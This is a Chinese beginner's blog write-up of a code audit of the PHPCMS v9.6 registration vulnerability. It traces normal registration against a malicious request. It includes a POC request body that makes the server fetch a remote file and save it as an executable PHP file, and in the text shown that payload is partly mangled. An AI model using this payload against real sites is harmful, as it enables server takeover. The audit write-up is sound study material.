**前言**：
这是我的第一次尝试进行代码审计，作为一个初学者，我深知在过程中可能会出现错误或理解不准确的地方。因此，我非常期待各位前辈的指正与建议。同时，我也希望通过分享这次经历，能够为那些刚开始接触或有兴趣学习代码审计的同学提供一些参考和启发。

**正文**：

### 审计思路
对于此次漏洞审计，我的方法是首先关注已知的漏洞POC（Proof of Concept），确定漏洞的具体位置；然后按照正常的业务流程运行一次，再将POC引入再次执行。这样做的原因是，我认为先走一遍正常流程可以帮助我对整个代码逻辑有一个基本的理解，而后再结合POC深入分析则有助于更好地把握漏洞的本质及其形成机制。

### 环境搭建
由于网络上关于PHPCMS环境配置的文章已经相当丰富，这里不再赘述。

### POC分析
考虑以下POC示例：
```
siteid=1&modelid=11&username=test2&password=test2123&email=PI:EMAIL&info[content]=&dosubmit=1&protocol=[http://127.0.0.1/phpinfo.txt?.php#.jpg>&dosubmit=1&protocol=](http://127.0.0.1/phpinfo.txt?.php#.jpg>&dosubmit=1&protocol=)
```
该POC主要针对的是用户注册过程中的一个安全问题，具体发生在`D:\phpStudy\PHPTutorial\WWW\PHPCMS\install_package\phpcms\modules\member\index.php`文件中。

#### 正常流程跟踪
- **提交表单数据**
  - `siteid=1&modelid=10&username=H12345&password=123456&pwdconfirm=123456&email=PI:EMAIL&nickname=HAsdsd&info[birthday]=2022-12-02&dosubmit=同意注册协议，提交注册&protocol=`

  - 注意到POC中的`modelid`值与普通注册时不同，并且`info`参数也存在差异。
  
- **关键变量追踪**
  - 当请求包含`dosubmit`字段时，程序会进入相应的处理逻辑。
  - 对于`$_POST['info']`的处理最终指向了`\caches\caches_model\caches_data\member_input.class.php`文件，在此文件中`$value`通过`datetime`函数进行了格式化。
  - 数据库查询显示，相关模型ID及日期时间字段均被正确识别并验证。
  - 用户信息随后被插入到`v9_member`表以及详细信息记录至`v9_member_detail`表中。

#### 异常行为解析
- **修改输入参数以触发漏洞**
  - 利用工具抓包后替换原始注册数据为POC内容。
  - 经过一系列标准校验步骤（如邮箱、手机号验证等）后，程序继续执行。
  - 在处理`$_POST['info']`时，尽管使用了XSS防护措施如`new_html_special_chars()`函数，但攻击者仍能通过精心构造的数据绕过这些限制。
  - 最终，恶意代码得以下载并在服务器端生成可执行文件，例如`20221231115044183.php`。

- **错误原因探讨**
  - 由于非法数据试图写入数据库导致类型不匹配错误发生，从而暴露了系统路径信息。

### 总结
通过对PHPCMS v9.6版本中存在的特定漏洞进行细致地剖析，不仅使我认识到了POC背后隐藏的安全风险，更重要的是学会了如何从根源上理解和防范此类问题。希望这篇文档能够对正在探索代码审计领域的朋友们有所帮助。当然，鉴于个人经验有限，恳请各位专家提出宝贵意见！